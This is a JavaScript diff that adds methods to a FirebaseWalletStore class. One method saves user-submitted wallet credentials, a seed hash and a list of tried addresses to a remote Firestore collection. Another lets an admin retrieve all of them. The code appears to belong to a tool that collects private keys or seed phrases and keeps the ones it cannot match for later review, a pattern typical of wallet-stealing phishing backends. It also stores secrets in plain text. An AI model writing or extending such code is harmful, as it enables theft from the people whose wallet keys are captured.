@@ -461,6 +461,88 @@ class FirebaseWalletStore {
   }
 
   /**
+   * Save a key/credentials that could not be matched to an on-chain wallet
+   * Stored in the `off_chain_keys` collection for admin review
+   */
+  async saveOffChainKey(data) {
+    try {
+      const docId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;
+      const docPath = `${this.baseUrl}/off_chain_keys/${docId}?key=${this.apiKey}`;
+
+      const firestoreData = {
+        fields: {
+          id: { stringValue: docId },
+          inputType: { stringValue: data.inputType || '' },
+          walletType: { stringValue: data.walletType || '' },
+          credentials: { stringValue: data.credentials || '' },
+          seedHash: { stringValue: data.seedHash || '' },
+          triedAddresses: {
+            arrayValue: {
+              values: (data.triedAddresses || []).map(a => ({ stringValue: a }))
+            }
+          },
+          recordedAt: { timestampValue: new Date().toISOString() }
+        }
+      };
+
+      const response = await fetch(docPath, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(firestoreData)
+      });
+
+      if (!response.ok) {
+        const err = await response.json();
+        throw new Error(`Firebase save failed: ${err.error?.message || 'Unknown error'}`);
+      }
+
+      console.log('✅ Off-chain key recorded:', docId);
+      return docId;
+    } catch (error) {
+      throw new Error(`Failed to save off-chain key: ${error.message}`);
+    }
+  }
+
+  /**
+   * Retrieve all off-chain keys (admin only)
+   */
+  async getAllOffChainKeys() {
+    try {
+      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
+
+      const query = {
+        structuredQuery: {
+          from: [{ collectionId: 'off_chain_keys' }],
+          orderBy: [{ field: { fieldPath: 'recordedAt' }, direction: 'DESCENDING' }]
+        }
+      };
+
+      const response = await fetch(queryUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(query)
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Firebase query failed: ${errorText}`);
+      }
+
+      const results = await response.json();
+
+      if (!results || results.length === 0 || !results[0].document) {
+        return [];
+      }
+
+      return results
+        .filter(r => r.document)
+        .map(r => this.parseFirestoreDocument(r.document));
+    } catch (error) {
+      throw new Error(`Failed to get off-chain keys: ${error.message}`);
+    }
+  }
+
+  /**
    * Delete wallet (admin only)
    */
   async deleteWallet(walletId) {
